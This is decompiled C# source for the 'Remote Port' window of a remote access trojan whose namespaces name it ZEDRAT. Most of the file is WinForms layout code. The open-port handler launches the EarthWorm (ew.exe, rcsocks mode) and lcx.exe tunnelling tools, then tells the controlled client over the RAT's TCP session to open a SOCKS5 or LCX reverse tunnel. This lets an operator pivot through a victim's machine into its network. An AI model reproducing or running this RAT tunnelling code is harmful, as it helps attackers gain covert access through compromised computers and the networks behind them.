using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Bunifu.UI.WinForms;
using Bunifu.UI.WinForms.BunifuButton;
using Guna.UI2.WinForms;
using ns1;
using ns2;
using Sockets;
using ZEDRAT.Algorithm;
using ZEDRAT.Messages;
using ZEDRAT.TCP;
using TextBox = ns2.TextBox;

namespace ZEDRatApp.Forms
{
	public class Remote_Port : Form
	{
		private TcpClientSession _tcs;

		private IContainer components;

		private SiticoneElipse siticoneElipse1;

		private SiticoneLabel siticoneLabel2;

		private SiticoneLabel siticoneLabel1;

		private SiticoneOSToggleSwith chkLCX;

		private SiticoneOSToggleSwith chkSocks5;

		private SiticoneLabel siticoneLabel4;

		private SiticoneLabel siticoneLabel3;

		private SiticoneRoundedTextBox txtPort;

		private SiticoneRoundedTextBox txtIP;

		private SiticoneRoundedButton btnOpenPort;

		private SiticoneRoundedButton btnStop;

		private SiticoneLabel siticoneLabel12;

		private SiticoneControlBox siticoneControlBox1;

		private BunifuSeparator bunifuSeparator1;

		private BunifuIconButton CloseBtn;

		private Guna2ShadowForm guna2ShadowForm1;

		public Remote_Port(string tital, TcpClientSession tcs)
		{
			this.InitializeComponent();
			this._tcs = tcs;
			this.Text = tital;
		}

		private void siticoneGradientCircleButton1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void BarraTitulo_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_Port.ReleaseCapture();
			Remote_Port.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void RemotePort_MouseDown(object sender, MouseEventArgs e)
		{
			Remote_Port.ReleaseCapture();
			Remote_Port.SendMessage(base.Handle, 274, 61458, 0);
		}

		private void siticoneRoundedButton1_Click(object sender, EventArgs e)
		{
		}

		public static bool IsIP(string ip)
		{
			return Regex.IsMatch(ip, "^((2[0-4]\\d|25[0-5]|[01]?\\d\\d?)\\.){3}(2[0-4]\\d|25[0-5]|[01]?\\d\\d?)$");
		}

		public void UpdataPortTypeForm(TcpClientSession ts, byte[] bt)
		{
		}

		private void RemotePort_Load(object sender, EventArgs e)
		{
			try
			{
				this._tcs?._Idispatchar?.Register(DataType.RemotePortType, new Action<TcpClientSession, byte[]>(UpdataPortTypeForm));
			}
			catch
			{
			}
		}

		private void RemotePort_FormClosed(object sender, FormClosedEventArgs e)
		{
			try
			{
				try
				{
					this._tcs?._Idispatchar?.Unregister(DataType.RemotePortType);
				}
				catch
				{
				}
				this._tcs.Client_Send(DataType.RemotePortType, Serializable.Serialize(new Remote_Port_Message
				{
					PortType = "stop"
				}));
			}
			catch
			{
			}
			finally
			{
				this._tcs = null;
			}
		}

		private void StartUpProcess(string exe, string parament)
		{
			using Process process = new Process();
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.CreateNoWindow = false;
			process.StartInfo.FileName = exe;
			process.StartInfo.Arguments = parament;
			process.Start();
		}

		private void btnStop_Click(object sender, EventArgs e)
		{
			try
			{
				this._tcs.Client_Send(DataType.RemotePortType, Serializable.Serialize(new Remote_Port_Message
				{
					PortType = "stop"
				}));
			}
			catch
			{
			}
		}

		private void btnOpenPort_Click(object sender, EventArgs e)
		{
			try
			{
				Remote_Port_Message remote_Port_Message = new Remote_Port_Message();
				string text = ((TextBox)this.txtIP).Text;
				if (!Remote_Port.IsIP(text))
				{
					MessageBox.Show("ip address input error");
					return;
				}
				((Control)(object)this.btnOpenPort).Enabled = false;
				string parament = "-s rcsocks -l 1008 -e " + ((TextBox)this.txtIP).Text;
				string parament2 = "-listen 1111 2222";
				if (this.chkSocks5.Checked)
				{
					string exe = Path.Combine(Environment.CurrentDirectory, "ew.exe");
					remote_Port_Message.PortType = "SOCKS5";
					this.StartUpProcess(exe, parament);
				}
				if (this.chkLCX.Checked)
				{
					string exe2 = Path.Combine(Environment.CurrentDirectory, "lcx.exe");
					remote_Port_Message.PortType = "lcx";
					this.StartUpProcess(exe2, parament2);
				}
				remote_Port_Message.AgentIp = text;
				remote_Port_Message.Port = ((TextBox)this.txtPort).Text;
				this._tcs.Client_Send(DataType.RemotePortType, Serializable.Serialize(remote_Port_Message));
			}
			catch
			{
			}
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
																																																																																	this.components = new System.ComponentModel.Container();
			Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges borderEdges = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderEdges();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(ZEDRatApp.Forms.Remote_Port));
			this.siticoneElipse1 = new SiticoneElipse(this.components);
			this.siticoneLabel1 = new SiticoneLabel();
			this.siticoneLabel2 = new SiticoneLabel();
			this.chkSocks5 = new SiticoneOSToggleSwith();
			this.chkLCX = new SiticoneOSToggleSwith();
			this.txtIP = new SiticoneRoundedTextBox();
			this.txtPort = new SiticoneRoundedTextBox();
			this.siticoneLabel3 = new SiticoneLabel();
			this.siticoneLabel4 = new SiticoneLabel();
			this.btnStop = new SiticoneRoundedButton();
			this.btnOpenPort = new SiticoneRoundedButton();
			this.siticoneLabel12 = new SiticoneLabel();
			this.siticoneControlBox1 = new SiticoneControlBox();
			this.bunifuSeparator1 = new Bunifu.UI.WinForms.BunifuSeparator();
			this.CloseBtn = new Bunifu.UI.WinForms.BunifuButton.BunifuIconButton();
			this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
			base.SuspendLayout();
			this.siticoneElipse1.BorderRadius = 0;
			this.siticoneElipse1.TargetControl = this;
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel1.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Location = new System.Drawing.Point(105, 136);
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Name = "siticoneLabel1";
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Size = new System.Drawing.Size(13, 15);
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).TabIndex = 2;
			((System.Windows.Forms.Control)(object)this.siticoneLabel1).Text = "IP";
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel2.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Location = new System.Drawing.Point(105, 184);
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Name = "siticoneLabel2";
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Size = new System.Drawing.Size(33, 15);
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).TabIndex = 3;
			((System.Windows.Forms.Control)(object)this.siticoneLabel2).Text = "PORT";
			this.chkSocks5.CheckedFillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkSocks5.CheckedInnerColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.chkSocks5).ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.chkSocks5).Location = new System.Drawing.Point(222, 233);
			((System.Windows.Forms.Control)(object)this.chkSocks5).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.chkSocks5).Name = "chkSocks5";
			((System.Windows.Forms.Control)(object)this.chkSocks5).Size = new System.Drawing.Size(63, 23);
			((System.Windows.Forms.Control)(object)this.chkSocks5).TabIndex = 46;
			((System.Windows.Forms.Control)(object)this.chkSocks5).Text = "chkSocks5";
			this.chkSocks5.UncheckedFillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			this.chkSocks5.UncheckInnerColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkLCX.CheckedFillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.chkLCX.CheckedInnerColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.chkLCX).ForeColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.chkLCX).Location = new System.Drawing.Point(630, 231);
			((System.Windows.Forms.Control)(object)this.chkLCX).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.chkLCX).Name = "chkLCX";
			((System.Windows.Forms.Control)(object)this.chkLCX).Size = new System.Drawing.Size(63, 23);
			((System.Windows.Forms.Control)(object)this.chkLCX).TabIndex = 47;
			((System.Windows.Forms.Control)(object)this.chkLCX).Text = "siticoneOSToggleSwith1";
			this.chkLCX.UncheckedFillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			this.chkLCX.UncheckInnerColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneTextBox)this.txtIP).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtIP).Cursor = System.Windows.Forms.Cursors.IBeam;
			((TextBox)this.txtIP).DefaultText = "ip";
			((SiticoneTextBox)this.txtIP).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			((SiticoneTextBox)this.txtIP).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			((SiticoneTextBox)this.txtIP).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			((SiticoneTextBox)this.txtIP).DisabledState.Parent = (TextBox)(object)this.txtIP;
			((SiticoneTextBox)this.txtIP).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			((SiticoneTextBox)this.txtIP).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((SiticoneTextBox)this.txtIP).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneTextBox)this.txtIP).FocusedState.Parent = (TextBox)(object)this.txtIP;
			((SiticoneTextBox)this.txtIP).HoveredState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneTextBox)this.txtIP).HoveredState.Parent = (TextBox)(object)this.txtIP;
			((System.Windows.Forms.Control)(object)this.txtIP).Location = new System.Drawing.Point(222, 121);
			((System.Windows.Forms.Control)(object)this.txtIP).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.txtIP).Name = "txtIP";
			((TextBox)this.txtIP).PasswordChar = '\0';
			((SiticoneTextBox)this.txtIP).PlaceholderText = "";
			((TextBox)this.txtIP).SelectedText = "";
			((SiticoneTextBox)this.txtIP).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtIP;
			((System.Windows.Forms.Control)(object)this.txtIP).Size = new System.Drawing.Size(570, 39);
			((System.Windows.Forms.Control)(object)this.txtIP).TabIndex = 73;
			((SiticoneTextBox)this.txtPort).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((System.Windows.Forms.Control)(object)this.txtPort).Cursor = System.Windows.Forms.Cursors.IBeam;
			((TextBox)this.txtPort).DefaultText = "port";
			((SiticoneTextBox)this.txtPort).DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
			((SiticoneTextBox)this.txtPort).DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
			((SiticoneTextBox)this.txtPort).DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			((SiticoneTextBox)this.txtPort).DisabledState.Parent = (TextBox)(object)this.txtPort;
			((SiticoneTextBox)this.txtPort).DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
			((SiticoneTextBox)this.txtPort).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((SiticoneTextBox)this.txtPort).FocusedState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneTextBox)this.txtPort).FocusedState.Parent = (TextBox)(object)this.txtPort;
			((SiticoneTextBox)this.txtPort).HoveredState.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneTextBox)this.txtPort).HoveredState.Parent = (TextBox)(object)this.txtPort;
			((System.Windows.Forms.Control)(object)this.txtPort).Location = new System.Drawing.Point(222, 170);
			((System.Windows.Forms.Control)(object)this.txtPort).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.txtPort).Name = "txtPort";
			((TextBox)this.txtPort).PasswordChar = '\0';
			((SiticoneTextBox)this.txtPort).PlaceholderText = "";
			((TextBox)this.txtPort).SelectedText = "";
			((SiticoneTextBox)this.txtPort).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.txtPort;
			((System.Windows.Forms.Control)(object)this.txtPort).Size = new System.Drawing.Size(570, 39);
			((System.Windows.Forms.Control)(object)this.txtPort).TabIndex = 74;
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel3.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Location = new System.Drawing.Point(295, 231);
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Name = "siticoneLabel3";
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Size = new System.Drawing.Size(39, 15);
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).TabIndex = 75;
			((System.Windows.Forms.Control)(object)this.siticoneLabel3).Text = "Socks5";
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel4.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Location = new System.Drawing.Point(703, 231);
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Name = "siticoneLabel4";
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Size = new System.Drawing.Size(53, 15);
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).TabIndex = 76;
			((System.Windows.Forms.Control)(object)this.siticoneLabel4).Text = "LCX Slave";
			((SiticoneButton)this.btnStop).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneButton)this.btnStop).BorderThickness = 1;
			((SiticoneButton)this.btnStop).CheckedState.Parent = (CustomButtonBase)(object)this.btnStop;
			((SiticoneButton)this.btnStop).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneButton)this.btnStop).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			((SiticoneButton)this.btnStop).CustomImages.Parent = (CustomButtonBase)(object)this.btnStop;
			((SiticoneButton)this.btnStop).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnStop).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnStop).ForeColor = System.Drawing.Color.White;
			((SiticoneButton)this.btnStop).HoveredState.Parent = (CustomButtonBase)(object)this.btnStop;
			((System.Windows.Forms.Control)(object)this.btnStop).Location = new System.Drawing.Point(607, 294);
			((System.Windows.Forms.Control)(object)this.btnStop).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.btnStop).Name = "btnStop";
			((SiticoneButton)this.btnStop).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnStop;
			((System.Windows.Forms.Control)(object)this.btnStop).Size = new System.Drawing.Size(212, 42);
			((System.Windows.Forms.Control)(object)this.btnStop).TabIndex = 77;
			((System.Windows.Forms.Control)(object)this.btnStop).Text = "Pause";
			((System.Windows.Forms.Control)(object)this.btnStop).Click += new System.EventHandler(btnStop_Click);
			((SiticoneButton)this.btnOpenPort).BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneButton)this.btnOpenPort).BorderThickness = 1;
			((SiticoneButton)this.btnOpenPort).CheckedState.Parent = (CustomButtonBase)(object)this.btnOpenPort;
			((SiticoneButton)this.btnOpenPort).CustomBorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			((SiticoneButton)this.btnOpenPort).CustomBorderThickness = new System.Windows.Forms.Padding(1, 0, 0, 0);
			((SiticoneButton)this.btnOpenPort).CustomImages.Parent = (CustomButtonBase)(object)this.btnOpenPort;
			((SiticoneButton)this.btnOpenPort).FillColor = System.Drawing.Color.FromArgb(18, 15, 24);
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Font = new System.Drawing.Font("Century Gothic", 9f);
			((System.Windows.Forms.Control)(object)this.btnOpenPort).ForeColor = System.Drawing.Color.White;
			((SiticoneButton)this.btnOpenPort).HoveredState.Parent = (CustomButtonBase)(object)this.btnOpenPort;
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Location = new System.Drawing.Point(105, 294);
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Name = "btnOpenPort";
			((SiticoneButton)this.btnOpenPort).ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.btnOpenPort;
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Size = new System.Drawing.Size(212, 42);
			((System.Windows.Forms.Control)(object)this.btnOpenPort).TabIndex = 78;
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Text = "Open Port";
			((System.Windows.Forms.Control)(object)this.btnOpenPort).Click += new System.EventHandler(btnOpenPort_Click);
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Anchor = System.Windows.Forms.AnchorStyles.Top;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).BackColor = System.Drawing.Color.Transparent;
			this.siticoneLabel12.Font = new System.Drawing.Font("Century Gothic", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			this.siticoneLabel12.ForeColor = System.Drawing.Color.LightGray;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Location = new System.Drawing.Point(377, 34);
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Name = "siticoneLabel12";
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Size = new System.Drawing.Size(167, 37);
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).TabIndex = 79;
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).Text = "Remote Port";
			((System.Windows.Forms.Control)(object)this.siticoneLabel12).MouseDown += new System.Windows.Forms.MouseEventHandler(BarraTitulo_MouseDown);
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			this.siticoneControlBox1.BorderColor = System.Drawing.Color.DarkGray;
			this.siticoneControlBox1.BorderRadius = 12;
			this.siticoneControlBox1.FillColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.siticoneControlBox1.HoveredState.Parent = (ControlBox)(object)this.siticoneControlBox1;
			this.siticoneControlBox1.IconColor = System.Drawing.Color.Black;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Location = new System.Drawing.Point(848, 19);
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Name = "siticoneControlBox1";
			this.siticoneControlBox1.PressedColor = System.Drawing.Color.Red;
			this.siticoneControlBox1.ShadowDecoration.Parent = (System.Windows.Forms.Control)(object)this.siticoneControlBox1;
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).Size = new System.Drawing.Size(75, 47);
			((System.Windows.Forms.Control)(object)this.siticoneControlBox1).TabIndex = 82;
			this.bunifuSeparator1.BackColor = System.Drawing.Color.Transparent;
			this.bunifuSeparator1.BackgroundImage = (System.Drawing.Image)resources.GetObject("bunifuSeparator1.BackgroundImage");
			this.bunifuSeparator1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			this.bunifuSeparator1.DashCap = Bunifu.UI.WinForms.BunifuSeparator.CapStyles.Flat;
			this.bunifuSeparator1.LineColor = System.Drawing.Color.DimGray;
			this.bunifuSeparator1.LineStyle = Bunifu.UI.WinForms.BunifuSeparator.LineStyles.DoubleEdgeFaded;
			this.bunifuSeparator1.LineThickness = 1;
			this.bunifuSeparator1.Location = new System.Drawing.Point(-5, 84);
			this.bunifuSeparator1.Margin = new System.Windows.Forms.Padding(8, 3, 8, 3);
			this.bunifuSeparator1.Name = "bunifuSeparator1";
			this.bunifuSeparator1.Orientation = Bunifu.UI.WinForms.BunifuSeparator.LineOrientation.Horizontal;
			this.bunifuSeparator1.Size = new System.Drawing.Size(950, 16);
			this.bunifuSeparator1.TabIndex = 83;
			this.CloseBtn.AllowAnimations = true;
			this.CloseBtn.AllowBorderColorChanges = true;
			this.CloseBtn.AllowMouseEffects = true;
			this.CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.None;
			this.CloseBtn.AnimationSpeed = 200;
			this.CloseBtn.BackColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BackgroundColor = System.Drawing.Color.Transparent;
			this.CloseBtn.BorderColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.CloseBtn.BorderRadius = 1;
			this.CloseBtn.BorderStyle = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.BorderStyles.Solid;
			this.CloseBtn.BorderThickness = 1;
			this.CloseBtn.ColorContrastOnClick = 30;
			this.CloseBtn.ColorContrastOnHover = 30;
			this.CloseBtn.Cursor = System.Windows.Forms.Cursors.Default;
			borderEdges.BottomLeft = true;
			borderEdges.BottomRight = true;
			borderEdges.TopLeft = true;
			borderEdges.TopRight = true;
			this.CloseBtn.CustomizableEdges = borderEdges;
			this.CloseBtn.DialogResult = System.Windows.Forms.DialogResult.None;
			this.CloseBtn.Image = (System.Drawing.Image)resources.GetObject("CloseBtn.Image");
			this.CloseBtn.ImageMargin = new System.Windows.Forms.Padding(0);
			this.CloseBtn.Location = new System.Drawing.Point(20, 19);
			this.CloseBtn.Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			this.CloseBtn.Name = "CloseBtn";
			this.CloseBtn.RoundBorders = false;
			this.CloseBtn.ShowBorders = true;
			this.CloseBtn.Size = new System.Drawing.Size(58, 57);
			this.CloseBtn.Style = Bunifu.UI.WinForms.BunifuButton.BunifuIconButton.ButtonStyles.Flat;
			this.CloseBtn.TabIndex = 170;
			this.guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(226, 28, 71);
			this.guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(10f, 21f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = System.Drawing.Color.FromArgb(9, 8, 13);
			base.ClientSize = new System.Drawing.Size(943, 381);
			base.Controls.Add(this.CloseBtn);
			base.Controls.Add(this.bunifuSeparator1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneControlBox1);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel12);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnOpenPort);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.btnStop);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel4);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel3);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtPort);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.txtIP);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.chkLCX);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.chkSocks5);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel2);
			base.Controls.Add((System.Windows.Forms.Control)(object)this.siticoneLabel1);
			this.Font = new System.Drawing.Font("Century Gothic", 12f);
			this.ForeColor = System.Drawing.Color.WhiteSmoke;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(5, 5, 5, 5);
			base.Name = "Remote_Port";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "RemotePort";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(RemotePort_FormClosed);
			base.Load += new System.EventHandler(RemotePort_Load);
			base.MouseDown += new System.Windows.Forms.MouseEventHandler(RemotePort_MouseDown);
			base.ResumeLayout(false);
			base.PerformLayout();
		}
	}
}
